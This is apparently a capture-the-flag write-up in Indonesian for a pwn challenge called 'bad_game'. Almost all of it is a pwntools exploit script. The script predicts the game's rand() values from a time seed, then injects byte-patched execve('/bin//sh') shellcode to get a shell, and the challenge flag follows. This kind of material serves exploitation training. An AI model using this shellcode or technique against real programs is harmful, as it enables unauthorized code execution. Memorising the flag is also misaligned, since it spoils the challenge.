# Nama Soal
---
## Deskripsi
simple game for you, have fun
## Solusi
Untuk menyelesaikan soal tersebut dapat menggunakan program yang telah dibuat sebagai berikut:
```
#!/usr/bin/env python2
from pwn import *
import sys
import ctypes

#MyTemplate
elf = ELF("./bad_game")

lokal = True
context.binary = elf
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False

if lokal:
    xp = process([elf.path])
else:
    host = ''
    port = ''
    xp = remote(host,port)

if Debug:
    context.terminal = ["tmux","splitw","-h"]
    cmd = "b *win+62 \n c"
    gdb.attach(xp,cmd)


#Exploit Here

LIBC = ctypes.cdll.LoadLibrary('./libc.so.6')
LIBC.srand(LIBC.time(0))

for i in range(100):
	target = LIBC.rand() % 1337
	print target
	sl(str(target))

encoded_shellcode = "\x48\x31"
encoded_shellcode += "\x66" #0xf6
encoded_shellcode += "\x56\x48"
encoded_shellcode += "\x2f" #0xbf
encoded_shellcode += "\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58"
encoded_shellcode += "\x29" #0x99
encoded_shellcode += "\x0f\x05"
sc = """
push 0x70707070
pop rcx
sub byte ptr[rsi + 17], cl
sub byte ptr[rsi + 20], cl
add byte ptr[rsi + 35], cl
"""
s(asm(sc)+encoded_shellcode)

xp.interactive()
```
#### ara2021{easy_simple_modifying_byte_shellcode_984ha}
